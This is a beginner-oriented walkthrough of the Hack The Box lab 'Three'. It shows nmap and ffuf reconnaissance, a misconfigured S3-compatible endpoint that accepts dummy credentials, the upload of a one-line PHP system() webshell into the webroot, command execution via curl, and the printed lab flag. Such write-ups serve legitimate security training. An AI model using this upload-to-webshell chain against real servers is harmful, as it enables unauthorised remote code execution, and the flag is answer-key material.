# HTB Lab "Three" — Detailed Notes 

**By:** Obito Uchiha — Team AKATSUKI
**Target IP:** `10.129.165.39`

---

## 1. What is this challenge about?

This is a **web + cloud misconfiguration** box. A normal website is running on the server, but behind it there's also a **fake Amazon S3 storage service** that is misconfigured. We exploit this misconfiguration to plant our own malicious file directly inside the website's files, and then use that file to execute commands on the server (RCE — Remote Code Execution).

---

## 2. Technologies Used (Table)

| Technology | Purpose |
|---|---|
| **Nmap** | Discover which ports are open on the target |
| **Apache 2.4.29** | Web server serving the website |
| **PHP** | Server-side scripting language the site's dynamic pages are written in |
| **Amazon S3 (fake/local clone)** | Cloud storage service — bucket-based file storage |
| **AWS CLI (awscli)** | Command-line tool used to interact with the S3 storage |
| **ffuf** | Web content fuzzing tool for discovering hidden directories/files |
| **curl** | Tool to manually send HTTP requests |
| **/etc/hosts** | Local file used to manually map a hostname to an IP when no DNS server is available |

---

## 3. Real-Life Analogy — To Understand the Concept

Imagine a **bank's locker room** (this represents the S3 bucket). Normally everyone has their own locker, and no one can open someone else's locker without the correct key (credentials).

But in this challenge, the security guard of the locker room is so careless that he accepts **any key** — real or fake (dummy credentials like "test"/"test"). And the biggest mistake is that **the entire bank's main-hall files (the live website) are actually stored inside this same locker room**.

So when we created our own "key" and placed our own **spy (shell.php)** inside the locker, that spy instantly started operating inside the bank's main hall (the live website) — because the locker and the website are the exact same location!

Similarly, **AWS CLI** is like the "key-insertion machine" that lets us enter the locker (bucket) and place our own item inside, without any real verification happening.

---

## 4. Beginner-to-Challenge Progression (Step-by-Step, as if teaching a complete beginner)

Let's start from the very beginning, as if you're solving a box for the first time.

### Step 0: First — find out what's running on the target
Whenever you get a new machine, the very first task is to **check the "doors" (ports)**. We use **Nmap** for this.

```
nmap -sS -p- --min-rate 2000 10.129.165.39 -vv -oN allPorts.txt
```

**Command breakdown:**
- `-sS` → Stealthy SYN scan (fast and less noisy)
- `-p-` → Scan all 65535 ports, not just the common ones
- `--min-rate 2000` → Keep the scan speed fast
- `-vv` → Verbose output (more detail)
- `-oN allPorts.txt` → Save the results to a file

**Result:** Ports **22 (SSH)** and **80 (HTTP)** were open. This tells us the server only exposes a website and an SSH login (which we won't access without credentials).

### Step 1: What service/version is running on the open ports?
```
nmap -sC -sV -O -p22,80 -T4 10.129.165.39 -vv -oN servicesVersions.txt
```
- `-sC` → Run default safe NSE scripts for extra info
- `-sV` → Detect service versions (Apache 2.4.29, OpenSSH 7.6p1, etc.)
- `-O` → Attempt OS detection

**Why does this matter?** Knowing the exact version (e.g. "Apache 2.4.29") lets us check for known vulnerabilities, such as CVE-2017-15715.

### Step 2: Manually inspect the website
```
curl -i http://10.129.165.39:80/
```
This sends an HTTP request like a browser would, and prints the response (headers + HTML) in the terminal. The site's title was "The Toppers," and its "Contact" section revealed the email domain `thetoppers.htb`.

### Step 3: Fuzz for hidden directories
```
ffuf -u http://10.129.165.39:80/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
**What does this do?** `FUZZ` is a placeholder — ffuf substitutes each line of the wordlist into that position and checks whether the resulting path exists. It's like trying every room in a house one by one.

### Step 4: Map the hostname to the IP (since there's no DNS)
Normally when you type `thetoppers.htb` into a browser, a DNS server translates that name into an IP address. But this lab has no DNS server, so we manually edit `/etc/hosts`:

```
sudo nano /etc/hosts
10.129.165.39  thetoppers.htb
```

**Analogy:** This is like not having someone's name saved in your phone, so you dial their number directly from memory. The `/etc/hosts` file is a small personal "phonebook" that only works on your own machine.

Further enumeration (or a hint) revealed another subdomain: **`s3.thetoppers.htb`** — also added to `/etc/hosts`.

### Step 5: Identify the service on the subdomain
Accessing `s3.thetoppers.htb` revealed it was running an **Amazon S3-compatible storage service** — not real AWS, but some tool that mimics S3's behavior (like a LocalStack-style or custom implementation).

### Step 6: What Is AWS CLI and How Does It Work (Detailed Explanation)

**AWS CLI (`awscli`)** is a command-line tool built to interact with Amazon Web Services. People normally use it to manage cloud storage (S3 buckets), servers (EC2), databases, etc. — all from the terminal instead of the AWS website.

S3 buckets are essentially **cloud folders** used to store files (images, documents, website backups, etc.). Every bucket has a name and access control — meaning only authorized users should be able to view or add files to it.

**But in this challenge:**
1. We found a fake/custom S3 service at `s3.thetoppers.htb` that speaks the AWS CLI protocol.
2. This service **did not actually enforce authentication** — meaning we didn't need a real AWS account.

**Setting it up:**
```
aws configure
AWS Access Key ID: test
AWS Secret Access Key: test
Default region name: us-east-1
Default output format: json
```
This command tells AWS CLI "here's my access key and secret key" — like entering a username/password at login. Normally, real AWS accounts require real keys. In this challenge, because the target server isn't actually real AWS (it's a fake/local implementation), **any dummy value (`test`/`test`) was accepted** — this is the actual vulnerability here: **weak/missing authentication**.

**Listing buckets:**
```
aws --endpoint-url=http://s3.thetoppers.htb s3 ls
```
- `--endpoint-url` → Tells AWS CLI to talk to **this custom server** instead of the real `amazonaws.com`.
- `s3 ls` → Just like Linux's `ls` command lists files in a folder, this lists all available S3 buckets.

**Result:** A bucket named `thetoppers.htb` was found — the bucket name matches the website's domain! This is a strong clue that this bucket likely holds the website's files.

**Viewing the bucket's contents:**
```
aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```
The result showed `index.php`, `.htaccess`, and an `images/` folder. The presence of `index.php` confirms the server uses **PHP** as its scripting language (this is also the answer to Task 9).

### Step 7: Exploitation — Webshell Upload

Now we understand that this bucket and the website's webroot are **the same location**. That means if we place a file into the bucket, it goes live on the website instantly!

**Created a webshell:**
```php
<?php system($_GET['cmd']); ?>
```
**What does this code do?** When this file is opened in a browser with a URL like `shell.php?cmd=id`, PHP's `system()` function runs that command (`id`) directly on the operating system — as if typed into a terminal.

**Uploading via S3 CLI:**
```
aws --endpoint-url=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
```
The `s3 cp` command copies a file from the local system into the bucket — just like the regular `cp` command copies files in Linux.

### Step 8: Confirm Code Execution
```
curl 'http://10.129.165.39/shell.php?cmd=id'
```
Result: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

This confirms our shell.php successfully landed in the webroot, and we can now **execute commands** on the server as `www-data` (Apache's default low-privilege user).

### Step 9: Find and Read the Flag
```
curl 'http://10.129.165.39/shell.php?cmd=ls%20..'
```
(`%20` represents a space in a URL, since literal spaces aren't allowed in URLs)

Result: `flag.txt` and an `html` folder were found one directory up.

```
curl 'http://10.129.165.39/shell.php?cmd=cat%20../flag.txt'
```

**Flag obtained:**
```
a980d99281a28d638ac68b9bf9453c2b
```

---

## 5. Vulnerabilities Summary

| Vulnerability | Explanation |
|---|---|
| **Unauthenticated S3 endpoint** | Any dummy credentials were accepted — no real verification was performed |
| **S3 bucket = Web Document Root** | The bucket was directly mapped to Apache's webroot, so an upload = an instantly live file |
| **Arbitrary File Upload** | Any file type (including .php) could be uploaded without filtering |
| **No input validation on uploaded content** | The webshell (`system()` call) was accepted with no restriction |
| **Resultant RCE** | Combining the above led to full Remote Code Execution |

---

## 6. Key Takeaways From This Challenge

1. Whenever you find a subdomain, **identify its service** — it may run on a completely different technology stack (like S3 here).
2. Always check whether cloud storage services (S3, GCS, Azure Blob) have **authentication properly enforced**.
3. If a storage bucket is linked to a web server's document root, **an upload can equal code execution** if scripting files (PHP, ASPX) are allowed.
4. Knowing how to use `/etc/hosts` is essential for any pentester — it's necessary whenever DNS isn't available.

---
*— Obito Uchiha, Team AKATSUKI*
